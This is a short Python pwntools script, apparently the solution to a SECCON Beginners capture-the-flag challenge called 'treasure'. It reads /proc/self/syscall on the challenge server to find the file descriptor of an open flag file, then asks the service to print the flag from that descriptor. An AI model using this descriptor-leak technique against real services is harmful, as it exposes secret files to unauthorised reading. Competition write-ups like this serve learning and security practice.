#!/usr/bin/env python3
from pwn import *

# context.log_level = 'debug'

remote_host = {'host':'treasure.beginners.seccon.games', 'port':13778}

def main():
    conn = remote(**remote_host)
    conn.sendlineafter(b'path: ', b'/proc/self/syscall')

    flag_fd = int(conn.recvline().split()[1], 16) - 1
    info(f'flag fd: {flag_fd}')

    conn.sendlineafter(b'fd: ', str(flag_fd).encode())
    flag = conn.recvline()[2:-4]
    success(f'FLAG: {flag.decode()}')

if __name__=='__main__':
    main()

